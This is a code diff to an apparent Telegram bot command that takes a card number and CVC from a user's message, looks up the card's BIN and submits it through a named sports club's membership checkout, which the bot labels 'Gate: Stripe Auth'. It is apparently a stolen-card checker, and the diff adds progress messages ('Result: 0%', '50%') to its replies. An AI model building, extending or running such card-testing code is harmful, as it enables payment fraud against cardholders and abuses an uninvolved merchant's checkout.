@@ -60,7 +60,7 @@ def sp_cmd(client, message):
             cvc = splitter[3]
             ab  = ccn[0:6]
             
-            wait = message.reply("**Wait For Results...**", reply_to_message_id=message.message_id)
+            wait = message.reply("**> Wait For Results...\n>--Result--: 0%\nGate: Stripe Auth**", reply_to_message_id=message.message_id)
             #####################################################################
             try:
                 bin = requests.get(f"https://bins-ws-api.deta.dev/api/{ccn}").json()
@@ -113,6 +113,9 @@ def sp_cmd(client, message):
                 pm = ye['id']
                 took = kya.elapsed.total_seconds()
                 stook = str(took)
+
+                wait.edit("**> Wait For Results...\n>--Result--: 50%\nGate: Stripe Auth**", reply_to_message_id=message.message_id)
+
                 url2 = 'https://www.ricsathleticassociation.com/membership-account/membership-checkout/?level=6/'
 
                 headers2 = {
